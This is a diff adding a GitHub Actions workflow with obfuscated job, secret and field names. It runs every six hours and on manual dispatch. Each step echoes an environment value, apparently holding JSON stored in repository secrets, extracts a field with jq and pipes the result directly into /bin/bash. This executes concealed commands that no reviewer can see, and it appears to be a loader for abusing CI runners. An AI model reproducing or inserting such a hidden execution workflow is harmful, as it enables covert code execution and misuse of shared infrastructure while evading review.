@@ -1,0 +1,24 @@
+name: bieshwolianshangalum
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: bieshwolianshangalum
+        env:
+          wio5435: ${{ secrets.wio5435 }}
+        run: |
+          echo $wio5435 | jq -r .dc8722 | /bin/bash
+          echo $eoh3 | jq -r .ek337 | /bin/bash
+          echo $et0791 | jq -r .prj9687 | /bin/bash
+          echo $f0047 | jq -r .qu69 | /bin/bash
+          echo $rysr1225 | jq -r .by92 | /bin/bash
+          echo $cewfp25126 | jq -r .m697 | /bin/bash
+          echo $k61 | jq -r .xcfb669 | /bin/bash
+
